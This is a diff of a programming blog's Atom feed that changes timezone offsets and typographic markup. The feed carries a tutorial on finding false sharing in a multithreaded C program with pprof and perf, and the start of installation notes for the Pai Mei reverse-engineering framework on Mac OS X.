@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all-en.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-02-26T00:00:00+01:00</updated><entry><title>Introduction to Using Profiling Tools</title><link href="http://codearcana.com/introduction-to-using-profiling-tools.html" rel="alternate"></link><updated>2013-02-26T00:00:00+01:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-02-26:introduction-to-using-profiling-tools.html</id><summary type="html">&lt;h2&gt;Performance tools&lt;/h2&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all-en.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-02-26T00:00:00-08:00</updated><entry><title>Introduction to Using Profiling Tools</title><link href="http://codearcana.com/introduction-to-using-profiling-tools.html" rel="alternate"></link><updated>2013-02-26T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-02-26:introduction-to-using-profiling-tools.html</id><summary type="html">&lt;h2&gt;Performance&amp;nbsp;tools&lt;/h2&gt;
 &lt;p&gt;Frequently, we need to identify slow portions of our programs so we can improve performance. There are a number of tools available to profile programs and identify how much time is spent where. The most common of these tools sample the program periodically, recording information to be later analyzed. Typically, they involve a phase spent recording data and a later phase for analyzing it. We will use two common tools to analyze a simple program: Google &lt;code&gt;pprof&lt;/code&gt; and Linux &lt;code&gt;perf&lt;/code&gt;.&lt;/p&gt;
 &lt;h3&gt;Google &lt;code&gt;pprof&lt;/code&gt;&lt;/h3&gt;
 &lt;p&gt;Google &lt;code&gt;pprof&lt;/code&gt; is a tool available as part of the Google &lt;a href="https://code.google.com/p/gperftools/"&gt;&lt;code&gt;perftools&lt;/code&gt;&lt;/a&gt; package. It is is used with
@@ -9,7 +9,7 @@
 
 
 &lt;p&gt;For any profile linked with &lt;code&gt;libprofiler&lt;/code&gt;, setting the environment variable &lt;code&gt;CPUPROFILE&lt;/code&gt; enables profiling and specifies the output file. The following command runs &lt;code&gt;./a.out&lt;/code&gt; and prints profiling data to &lt;code&gt;out.prof&lt;/code&gt;:&lt;/p&gt;
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;CPUPROFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;out.prof ./a.out
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;&lt;span class="caps"&gt;CPUPROFILE&lt;/span&gt;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;out.prof ./a.out
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -28,14 +28,14 @@
 
 &lt;p&gt;See full documentation &lt;a href="https://google-perftools.googlecode.com/svn/trunk/doc/cpuprofile.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
 &lt;h3&gt;Linux &lt;code&gt;perf&lt;/code&gt;&lt;/h3&gt;
-&lt;p&gt;On Linux, the &lt;code&gt;perf&lt;/code&gt; system is a powerful tool for analyzing program / system performance. It provides some nice abstractions over tracking hardware counters on different CPUs. It defines a number of events to be tracked and recorded. Run &lt;code&gt;perf list&lt;/code&gt; to see a list of the events allowed on your system. &lt;/p&gt;
-&lt;p&gt;To use &lt;code&gt;perf&lt;/code&gt;, you run: &lt;/p&gt;
+&lt;p&gt;On Linux, the &lt;code&gt;perf&lt;/code&gt; system is a powerful tool for analyzing program / system performance. It provides some nice abstractions over tracking hardware counters on different CPUs. It defines a number of events to be tracked and recorded. Run &lt;code&gt;perf list&lt;/code&gt; to see a list of the events allowed on your&amp;nbsp;system. &lt;/p&gt;
+&lt;p&gt;To use &lt;code&gt;perf&lt;/code&gt;, you&amp;nbsp;run: &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
 &lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;
 
 &lt;span class="go"&gt;    3121.725439 task-clock                #    0.997 CPUs utilized          &lt;/span&gt;
 &lt;span class="go"&gt;             11 context-switches          #    0.000 M/sec                  &lt;/span&gt;
-&lt;span class="go"&gt;              7 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
+&lt;span class="go"&gt;              7 &lt;span class="caps"&gt;CPU&lt;/span&gt;-migrations            #    0.000 M/sec                  &lt;/span&gt;
 &lt;span class="go"&gt;            308 page-faults               #    0.000 M/sec                  &lt;/span&gt;
 &lt;span class="go"&gt;  9,121,960,506 cycles                    #    2.922 GHz                     [83.32%]&lt;/span&gt;
 &lt;span class="go"&gt;  5,213,187,548 stalled-cycles-frontend   #   57.15% frontend cycles idle    [83.32%]&lt;/span&gt;
@@ -49,28 +49,28 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;In addition to &lt;code&gt;perf stat&lt;/code&gt;, there quite a few other ways to use perf. Run &lt;/p&gt;
+&lt;p&gt;In addition to &lt;code&gt;perf stat&lt;/code&gt;, there quite a few other ways to use perf.&amp;nbsp;Run &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;to see a list of the commands (you might want to look into &lt;code&gt;perf record&lt;/code&gt; and &lt;code&gt;perf annotate&lt;/code&gt;). &lt;/p&gt;
 &lt;p&gt;For an example of this being used in real life, see this excellent analysis of  &lt;a href="http://thread.gmane.org/gmane.comp.version-control.git/172286"&gt;this analysis of a string comparison bottleneck in &lt;code&gt;git gc&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h2&gt;Our Investigation&lt;/h2&gt;
+&lt;h2&gt;Our&amp;nbsp;Investigation&lt;/h2&gt;
 &lt;p&gt;We compile the program with &lt;code&gt;-lprofiler&lt;/code&gt; so we can generate output to examine. &lt;code&gt;try_perf.c&lt;/code&gt; is a C program that counts the number of even values
 in an array of random numbers. We run with 8 threads that all increment a global
-counter every time they see an even number.&lt;/p&gt;
+counter every time they see an even&amp;nbsp;number.&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; gcc try_perf.c -g -lprofiler -lpthread
-&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;CPUPROFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;a.out.prof ./a.out --num_threads&lt;span class="o"&gt;=&lt;/span&gt;8
+&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;&lt;span class="caps"&gt;CPUPROFILE&lt;/span&gt;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;a.out.prof ./a.out --num_threads&lt;span class="o"&gt;=&lt;/span&gt;8
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We run pprof and get the source code annotated with the number of probes that 
-hit that instruction during the trace (result below trimmed for brevity).&lt;/p&gt;
+hit that instruction during the trace (result below trimmed for&amp;nbsp;brevity).&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out a.out.prof
 &lt;span class="go"&gt; ... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
 &lt;span class="go"&gt;   .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
-&lt;span class="go"&gt;   .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
+&lt;span class="go"&gt;   .      .   61:    // &lt;span class="caps"&gt;TODO&lt;/span&gt;(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
 &lt;span class="go"&gt;   .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
 &lt;span class="go"&gt;   .      .   63:  size_t i;&lt;/span&gt;
 &lt;span class="go"&gt;   .      .   64: &lt;/span&gt;
@@ -84,7 +84,7 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;The output above is actually misleading: if you look at the assembly (shown below), the instruction immediately after the atomic instruction (the &lt;code&gt;addq   $0x1,-0x8(%rbp)&lt;/code&gt; after the &lt;code&gt;lock addq $0x1,(%rax)&lt;/code&gt;) gets excess hits that count towards the for loop when they should probably count towards the atomic instruction.&lt;/p&gt;
+&lt;p&gt;The output above is actually misleading: if you look at the assembly (shown below), the instruction immediately after the atomic instruction (the &lt;code&gt;addq   $0x1,-0x8(%rbp)&lt;/code&gt; after the &lt;code&gt;lock addq $0x1,(%rax)&lt;/code&gt;) gets excess hits that count towards the for loop when they should probably count towards the atomic&amp;nbsp;instruction.&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --disas&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out a.out.prof
 &lt;span class="go"&gt; ... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
 &lt;span class="go"&gt;  9    300    68: __sync_fetch_and_add(arg-&amp;gt;num_evens, 1);&lt;/span&gt;
@@ -98,13 +98,13 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 
 
 &lt;p&gt;Hrm. Why are we spending a lot of time in &lt;code&gt;lock addq $0x1,(%rax)&lt;/code&gt;?&lt;/p&gt;
-&lt;p&gt;To understand this, we will use &lt;code&gt;perf&lt;/code&gt;. Run: &lt;/p&gt;
+&lt;p&gt;To understand this, we will use &lt;code&gt;perf&lt;/code&gt;.&amp;nbsp;Run: &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
 &lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;
 
 &lt;span class="go"&gt;    5793.307952 task-clock                #    2.157 CPUs utilized          &lt;/span&gt;
 &lt;span class="go"&gt;            589 context-switches          #    0.000 M/sec                  &lt;/span&gt;
-&lt;span class="go"&gt;             11 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
+&lt;span class="go"&gt;             11 &lt;span class="caps"&gt;CPU&lt;/span&gt;-migrations            #    0.000 M/sec                  &lt;/span&gt;
 &lt;span class="go"&gt;          1,974 page-faults               #    0.000 M/sec                  &lt;/span&gt;
 &lt;span class="go"&gt; 16,378,904,731 cycles                    #    2.827 GHz                     [83.37%]&lt;/span&gt;
 &lt;span class="go"&gt; 10,407,719,950 stalled-cycles-frontend   #   63.54% frontend cycles idle    [83.38%]&lt;/span&gt;
@@ -118,7 +118,7 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Wow, thats a lot of stalled instructions! The 8 threads are sharing the same counter, generating a lot of memory traffic. We modify the program so they all use their own counter, and then we aggregate at the end (if we do this, we don't need to use the atomic instruction).&lt;/p&gt;
+&lt;p&gt;Wow, thats a lot of stalled instructions! The 8 threads are sharing the same counter, generating a lot of memory traffic. We modify the program so they all use their own counter, and then we aggregate at the end (if we do this, we don&amp;#8217;t need to use the atomic&amp;nbsp;instruction).&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
 &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
@@ -127,20 +127,20 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
      &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
      &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;inarray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
      &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-     &lt;span class="n"&gt;pthread_create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;thread_scan&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+     &lt;span class="n"&gt;pthread_create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;&lt;span class="caps"&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;thread_scan&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;   
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-     &lt;span class="n"&gt;pthread_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+     &lt;span class="n"&gt;pthread_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;&lt;span class="caps"&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;But that didn't seem to help at all! We still spend most of our time on the increment, even though we aren't using an atomic instruction: &lt;/p&gt;
+&lt;p&gt;But that didn&amp;#8217;t seem to help at all! We still spend most of our time on the increment, even though we aren&amp;#8217;t using an atomic&amp;nbsp;instruction: &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out out.prof
 &lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
 &lt;span class="go"&gt;  .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
-&lt;span class="go"&gt;  .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
+&lt;span class="go"&gt;  .      .   61:    // &lt;span class="caps"&gt;TODO&lt;/span&gt;(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
 &lt;span class="go"&gt;  .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
 &lt;span class="go"&gt;  .      .   63:  size_t i;&lt;/span&gt;
 &lt;span class="go"&gt;  .      .   64: &lt;/span&gt;
@@ -154,13 +154,13 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Why could this be? Lets run &lt;code&gt;perf stat&lt;/code&gt; again and see:&lt;/p&gt;
+&lt;p&gt;Why could this be? Lets run &lt;code&gt;perf stat&lt;/code&gt; again and&amp;nbsp;see:&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
 &lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;
 
 &lt;span class="go"&gt;      4372.474270 task-clock                #    1.882 CPUs utilized          &lt;/span&gt;
 &lt;span class="go"&gt;              385 context-switches          #    0.000 M/sec                  &lt;/span&gt;
-&lt;span class="go"&gt;                9 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
+&lt;span class="go"&gt;                9 &lt;span class="caps"&gt;CPU&lt;/span&gt;-migrations            #    0.000 M/sec                  &lt;/span&gt;
 &lt;span class="go"&gt;            1,135 page-faults               #    0.000 M/sec                  &lt;/span&gt;
 &lt;span class="go"&gt;   12,411,517,583 cycles                    #    2.839 GHz                     [83.26%]&lt;/span&gt;
 &lt;span class="go"&gt;    6,270,257,100 stalled-cycles-frontend   #   50.52% frontend cycles idle    [83.33%]&lt;/span&gt;
@@ -174,12 +174,12 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;What is going on now? We &lt;em&gt;still&lt;/em&gt; have a lot of stalled instructions, but all those counters are different. See?&lt;/p&gt;
+&lt;p&gt;What is going on now? We &lt;em&gt;still&lt;/em&gt; have a lot of stalled instructions, but all those counters are different.&amp;nbsp;See?&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Oh, they are all on the same cache line - we're experiencing false sharing. Let us use a thread local counter thats on a different cache line for each thread:&lt;/p&gt;
+&lt;p&gt;Oh, they are all on the same cache line - we&amp;#8217;re experiencing false sharing. Let us use a thread local counter thats on a different cache line for each&amp;nbsp;thread:&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nf"&gt;thread_scan&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;void_arg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="kt"&gt;thread_arg_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;thread_arg_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;void_arg&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
   &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -204,11 +204,11 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;And then look at the profile:&lt;/p&gt;
+&lt;p&gt;And then look at the&amp;nbsp;profile:&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out out.prof
 &lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
 &lt;span class="go"&gt;  .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
-&lt;span class="go"&gt;  .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
+&lt;span class="go"&gt;  .      .   61:    // &lt;span class="caps"&gt;TODO&lt;/span&gt;(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
 &lt;span class="go"&gt;  .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
 &lt;span class="go"&gt;  .      .   63:  size_t i;&lt;/span&gt;
 &lt;span class="go"&gt;  .      .   64:  size_t num_evens;&lt;/span&gt;
@@ -224,13 +224,13 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Good, our increment doesn't dominate the function anymore. We look at &lt;code&gt;perf stat&lt;/code&gt; and see:&lt;/p&gt;
+&lt;p&gt;Good, our increment doesn&amp;#8217;t dominate the function anymore. We look at &lt;code&gt;perf stat&lt;/code&gt; and&amp;nbsp;see:&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
 &lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;
 
 &lt;span class="go"&gt;    2977.781539 task-clock                #    1.472 CPUs utilized          &lt;/span&gt;
 &lt;span class="go"&gt;            177 context-switches          #    0.000 M/sec                  &lt;/span&gt;
-&lt;span class="go"&gt;             12 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
+&lt;span class="go"&gt;             12 &lt;span class="caps"&gt;CPU&lt;/span&gt;-migrations            #    0.000 M/sec                  &lt;/span&gt;
 &lt;span class="go"&gt;          3,506 page-faults               #    0.001 M/sec                  &lt;/span&gt;
 &lt;span class="go"&gt;  8,523,367,658 cycles                    #    2.862 GHz                     [83.32%]&lt;/span&gt;
 &lt;span class="go"&gt;  2,057,253,537 stalled-cycles-frontend   #   24.14% frontend cycles idle    [83.26%]&lt;/span&gt;
@@ -244,31 +244,32 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Ah, perfect! 30% faster than our original solution and significantly fewer stalled instructions.&lt;/p&gt;</summary><category term="performance"></category><category term="profiling"></category></entry><entry><title>Pai Mei on Mac OSX 10.8</title><link href="http://codearcana.com/pai-mei-on-mac-osx-108.html" rel="alternate"></link><updated>2012-10-28T00:00:00+02:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-10-28:pai-mei-on-mac-osx-108.html</id><summary type="html">&lt;h3&gt;Getting the libraries&lt;/h3&gt;
+&lt;p&gt;Ah, perfect! 30% faster than our original solution and significantly fewer stalled&amp;nbsp;instructions.&lt;/p&gt;</summary><category term="profiling"></category></entry><entry><title>Pai Mei on Mac OSX 10.8</title><link href="http://codearcana.com/pai-mei-on-mac-osx-108.html" rel="alternate"></link><updated>2012-10-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-10-28:pai-mei-on-mac-osx-108.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac &lt;span class="caps"&gt;OSX&lt;/span&gt; but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing Pai Mei on Mac&amp;nbsp;&lt;span class="caps"&gt;OSX&lt;/span&gt;.&lt;/p&gt;
+&lt;h3&gt;Getting the&amp;nbsp;libraries&lt;/h3&gt;
 
-&lt;p&gt;The most difficult thing was finding how to get all the packages working. First and foremost, Pai Mei was designed for a 32 bit windows libary so some trickery is required to get it to work in 64 bit mode (which is necessary, because I could not get the latest &lt;tt&gt;wxPython&lt;/tt&gt; from Homebrew to work in 32 bit mode). I did not realize at first that there was a way to use Pai Mei in 64 bit mode, so I spent a long time attempting to find universal binaries for wxPython and MySql.&lt;/p&gt;
+&lt;p&gt;The most difficult thing was finding how to get all the packages working. First and foremost, Pai Mei was designed for a 32 bit windows libary so some trickery is required to get it to work in 64 bit mode (which is necessary, because I could not get the latest &lt;tt&gt;wxPython&lt;/tt&gt; from Homebrew to work in 32 bit mode). I did not realize at first that there was a way to use Pai Mei in 64 bit mode, so I spent a long time attempting to find universal binaries for wxPython and&amp;nbsp;MySql.&lt;/p&gt;
 &lt;p&gt;Pai Mei depends on a number of packages:
 &lt;ul&gt;
     &lt;li&gt;&lt;tt&gt;mysql-python&lt;/tt&gt;: I installed via &lt;tt&gt;pip install mysql-python&lt;/tt&gt;.&lt;/li&gt;
     &lt;li&gt;&lt;tt&gt;pydasm&lt;/tt&gt;: I installed via &lt;tt&gt;pip install pydasm&lt;/tt&gt;.&lt;/li&gt;
-        &lt;li&gt;&lt;tt&gt;ctypes&lt;/tt&gt;: I believe is included by default in Python 2.5 and higher.&lt;/li&gt;
-        &lt;li&gt;&lt;tt&gt;MySql&lt;/tt&gt;: I installed via &lt;tt&gt;brew install mysql --universal&lt;/tt&gt; to have a universal binary (downloading from the MySql homepage means you will get a single architecture binary).&lt;/li&gt;
-        &lt;li&gt;&lt;tt&gt;wxPython&lt;/tt&gt;: I installed via &lt;tt&gt;brew install wxmac --universal&lt;/tt&gt; and then manually symlinked it into correct location: &lt;/p&gt;
+        &lt;li&gt;&lt;tt&gt;ctypes&lt;/tt&gt;: I believe is included by default in Python 2.5 and&amp;nbsp;higher.&lt;/li&gt;
+        &lt;li&gt;&lt;tt&gt;MySql&lt;/tt&gt;: I installed via &lt;tt&gt;brew install mysql &amp;#8212;universal&lt;/tt&gt; to have a universal binary (downloading from the MySql homepage means you will get a single architecture&amp;nbsp;binary).&lt;/li&gt;
+        &lt;li&gt;&lt;tt&gt;wxPython&lt;/tt&gt;: I installed via &lt;tt&gt;brew install wxmac &amp;#8212;universal&lt;/tt&gt; and then manually symlinked it into correct&amp;nbsp;location: &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wx /Library/Python/2.7/site-packages/wx
 &lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info /Library/Python/2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info
 &lt;/pre&gt;&lt;/div&gt;
 
 
